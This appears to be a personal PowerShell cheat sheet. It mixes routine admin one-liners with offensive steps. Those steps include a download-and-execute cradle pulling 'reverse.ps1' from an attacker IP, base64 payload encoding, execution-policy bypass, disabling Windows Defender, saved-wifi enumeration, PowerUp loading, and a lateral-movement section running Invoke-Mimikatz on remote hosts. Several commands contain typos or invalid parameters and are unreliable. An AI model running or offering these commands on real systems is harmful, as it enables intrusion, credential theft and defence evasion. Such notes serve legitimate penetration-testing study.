###### powershell: find hidden files recursice  
`Get-ChildItem -Hidden -Recursive \path\`
  
###### powershell: compress (zip) a file  
`Compress-Archive -U -LiteralPath \source\path\ -DestinationPath \path\newfile`
  
###### powershell: unzip a file  
`Expand-Archive -LiteralPath \source\path\ -DestinationPath \path\target`  
  
###### powershell: extract string of command result  
`findstr "something"  `
  
###### powershell: show all bssids of saved wifi networks  
`netsh wlan show profiles * | findstr "SSID-Name"  `
  
###### powershell: allow execution of all ps scripts  
`Set-ExecutionPolicy Unrestricted`
  
###### powershell: list execution policies  
`Get-ExecutionPolicy -List`
  
###### powershell: display file contents  
`Get-Content <file>  `
  
###### powershell: CMDlet help  
`Get-Help <CMDlet> -Examples -Parameter Name`
  
###### powershell: display ps version  
`$PSVersionTable`
  
###### powershell: run PS v2  
`powershell.exe -version 2.0  `
  
###### powershell: list running services  
`Get-Service | where_object {$_.status -eq "Running"}  `
  
###### powershell: return services  
`get-service | measure-object  `
  
###### powershell: return list of PSDrives  
`get-psdrive  `
  
###### powershell: return only names  
`get-process | select -expandproperty name  `
  
###### powershell: export OS information to CSV  
`Get-WmiObject -class win32_operatingsystem | select -property * | export-csv c:\os.txt  `
  
###### powershell: download file over HTTP  
`(new-object system.net.webclient).downloadFile("url","dest")  `
  
###### powershell: list hostname and IP for all domain computers  
`Get-WmiObject -ComputerName <DC> -Namespace root\microsoftDNS -Class MicrosoftDNS_ResourceRecord  Filter "domainname=' <DOMAIN>'" | select textrepresentation  `
  
###### powershell donload file  
`IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8000/reverse.ps1')  `
`cat reverse.ps1 | iconv -t UTF-16LE | base64 -w0 powershell -enc "BASE64"`

###### Invoke Script
`.\Script.ps1`
`Invoke-Function`

###### Bypass execution policy
`Get-ExecutionPolicy`
`powershell.exe -ep bypass`
`powershell.exe -executionppolicy bypass .\script.ps1`

###### GetAliase
`Get-Alias -Name dir`
`Get-Alias -Definition Get-Childitem`

###### Get Command
`Get-Command -CommandType cmdlet`
`Get-Command -Name *process*`

###### Disable windows defender by admin
`Set-MpPreference -DisableRealtimeMonitoring $true`

###### Invoke script
`. .\Invoke-Encode.ps1`
`Import-Module .\PowerUp.ps1`
`Get-Module -ListAvailable`

###### Enum services path
`Get-WmiObject -Class win32_service |select pathname`

# Leteral moving
`New-PSSession -ComputerName op-terminalser`
`$sess = New-PSSession -ComputerName op-terminalser`
`Enter-PSSession -Session $sess`
`hostname`

`Invoke-Command -ScriptBlock{whoami,hostaname} -ComputerName ops-terminalser` #invoke command on other computer
`Invoke-Command -ScriptBlock{$who = whoami} -ComputerName ops-terminalser` #invoke command on other computer
`Invoke-Command -FilePath c:\temp\invoke-encode.ps1 -ComputerName ops-terminalser`
`powershell -ep bypass`
`. .\C:\Temp\Invoke-Mimikatz.ps1`
`Invoke-Command -ScriptBlock{Invoke-Mimikatz} -ComputerName ops-terminalser` #invoke command on other computer
`Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -ComputerName ops-terminalser` #invoke command on other computer

`$sess = New-PSSession -ComputerName Server1`
`Invoke-Command -Session $sess -ScriptBlock {$Proc = Get-Process}`
`Invoke-Command -Session $sess -ScriptBlock {$Proc.Name}`
